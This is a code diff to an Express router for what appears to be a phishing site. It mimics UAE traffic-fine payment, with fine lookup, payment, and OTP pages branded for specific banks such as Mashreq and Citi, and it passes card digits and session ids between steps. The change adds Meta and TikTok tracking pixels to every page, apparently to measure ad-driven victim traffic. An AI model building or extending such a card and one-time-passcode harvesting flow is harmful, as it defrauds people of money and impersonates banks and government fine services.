@@ -2,28 +2,39 @@ const express = require('express');
 const router  = express.Router();
 const { getSetting } = require('../db');
 
+async function getPixelData() {
+  const metaPixelId   = await getSetting('meta_pixel_id',   '');
+  const tiktokPixelId = await getSetting('tiktok_pixel_id', '');
+  let pixelTriggers = {};
+  try { pixelTriggers = JSON.parse(await getSetting('pixel_event_triggers', '{}')); } catch(e) {}
+  return { metaPixelId, tiktokPixelId, pixelTriggers };
+}
+
 const EMIRATE_NAMES = {
   DXB:'Dubai', AUH:'Abu Dhabi', SHJ:'Sharjah',
   AJM:'Ajman', UAQ:'Umm Al Quwain', RAK:'Ras Al Khaimah', FUJ:'Fujairah',
 };
 
 router.get('/', async (req, res) => {
-  const metaPixelId   = await getSetting('meta_pixel_id',   '');
-  const tiktokPixelId = await getSetting('tiktok_pixel_id', '');
-  res.render('index', { metaPixelId, tiktokPixelId });
+  const pixel = await getPixelData();
+  res.render('index', { ...pixel, pixelCurrentPath: '/' });
 });
 
-router.get('/fines', (req, res) => {
+router.get('/fines', async (req, res) => {
+  const pixel = await getPixelData();
   const { plateNo='', plateCat='2', plateSrcCode='DXB', plateCodeId='0', plateCodeLetter='' } = req.query;
   res.render('fines', {
+    ...pixel, pixelCurrentPath: '/fines',
     plateNo, plateCat, plateSrcCode, plateCodeId, plateCodeLetter,
     emirateName: EMIRATE_NAMES[plateSrcCode] || plateSrcCode,
   });
 });
 
-router.get('/payment', (req, res) => {
+router.get('/payment', async (req, res) => {
+  const pixel = await getPixelData();
   const { plateNo='', plateSrcCode='', plateCodeLetter='', totalFine='0', fineCount='0' } = req.query;
   res.render('payment', {
+    ...pixel, pixelCurrentPath: '/payment',
     plateNo, plateSrcCode, plateCodeLetter,
     totalFine:  parseInt(totalFine)  || 0,
     fineCount:  parseInt(fineCount)  || 0,
@@ -31,9 +42,11 @@ router.get('/payment', (req, res) => {
   });
 });
 
-router.get('/otp-loading', (req, res) => {
+router.get('/otp-loading', async (req, res) => {
+  const pixel = await getPixelData();
   const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
   res.render('otp-loading', {
+    ...pixel, pixelCurrentPath: '/otp-loading',
     amount: parseInt(amount) || 0,
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
@@ -42,9 +55,11 @@ router.get('/otp-loading', (req, res) => {
   });
 });
 
-router.get('/otp-sms', (req, res) => {
+router.get('/otp-sms', async (req, res) => {
+  const pixel = await getPixelData();
   const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='' } = req.query;
   res.render('otp-sms', {
+    ...pixel, pixelCurrentPath: '/otp-sms',
     amount: parseInt(amount) || 0,
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
@@ -54,9 +69,11 @@ router.get('/otp-sms', (req, res) => {
   });
 });
 
-router.get('/otp', (req, res) => {
+router.get('/otp', async (req, res) => {
+  const pixel = await getPixelData();
   const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
   res.render('otp', {
+    ...pixel, pixelCurrentPath: '/otp',
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
     issuer,
@@ -65,9 +82,11 @@ router.get('/otp', (req, res) => {
   });
 });
 
-router.get('/waiting', (req, res) => {
+router.get('/waiting', async (req, res) => {
+  const pixel = await getPixelData();
   const { cardLast4='****', totalFine='0', issuer='', sid='' } = req.query;
   res.render('waiting', {
+    ...pixel, pixelCurrentPath: '/waiting',
     cardLast4,
     totalFine: parseInt(totalFine) || 0,
     issuer,
@@ -75,19 +94,23 @@ router.get('/waiting', (req, res) => {
   });
 });
 
-router.get('/otp-mashreq', (req, res) => {
+router.get('/otp-mashreq', async (req, res) => {
+  const pixel = await getPixelData();
   const { totalFine='0', cardLast4='****', issuer='Mashreq', sid='' } = req.query;
-  res.render('otp-mashreq', { totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
+  res.render('otp-mashreq', { ...pixel, pixelCurrentPath: '/otp-mashreq', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
 });
 
-router.get('/otp-citi', (req, res) => {
+router.get('/otp-citi', async (req, res) => {
+  const pixel = await getPixelData();
   const { totalFine='0', cardLast4='****', issuer='Citi', sid='' } = req.query;
-  res.render('otp-citi', { totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
+  res.render('otp-citi', { ...pixel, pixelCurrentPath: '/otp-citi', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
 });
 
-router.get('/otp-approved', (req, res) => {
+router.get('/otp-approved', async (req, res) => {
+  const pixel = await getPixelData();
   const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
   res.render('otp-approved', {
+    ...pixel, pixelCurrentPath: '/otp-approved',
     totalFine:  parseInt(totalFine) || 0,
     cardLast4,
     issuer,
